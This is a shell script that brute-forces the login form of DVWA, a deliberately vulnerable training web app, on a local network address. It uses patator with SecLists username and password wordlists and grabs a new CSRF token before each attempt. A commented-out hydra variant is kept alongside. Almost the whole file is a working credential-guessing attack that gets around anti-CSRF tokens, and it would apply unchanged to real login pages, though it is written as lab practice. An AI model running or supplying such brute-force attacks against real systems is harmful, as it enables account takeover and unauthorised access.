#Connect to the actual page for brute force
# curl -s -i -L 192.168.178.98/dvwa/vulnerabilities/brute/  > vuln
#
source ../levelled_login.sh high
#Check out the "bruteforce" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/brute/ > /dev/null
#Get new CSRF, Send our known login
# CSRFHIGH=$(cat vuln | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
#Hydra can't do the job like this, no new CSRF tokens are useable
# rm hydra.restore
# hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRFHIGH}:S=Welcome:H=Cookie: security=high; PHPSESSID=${SESSIONID}:C=/404.php"
#Use patator for attack (lacks highlighting for positive matches)
python ~/Desktop/patator/patator.py http_fuzz method=GET follow=0 accept_cookie=0 --threads=1 timeout=5 --max-retries=0 url="http://192.168.178.98/dvwa/vulnerabilities/brute/?username=FILE1&password=FILE0&user_token=TOKEN&Login=Login" 1=/Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt 0=/Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt header="Cookie: security=${SECURITY}; PHPSESSID=${SESSIONID}" before_urls="http://192.168.178.98/dvwa/vulnerabilities/brute/" before_header="Cookie: security=${SECURITY}; PHPSESSID=${SESSIONID}" before_egrep="TOKEN:value='(\w+)'" -x quit:fgrep="Welcome" -l log/
echo "Press [ENTER] to delete the log files!"
read
rm -rf log
unset LEVEL
unset SESSIONID
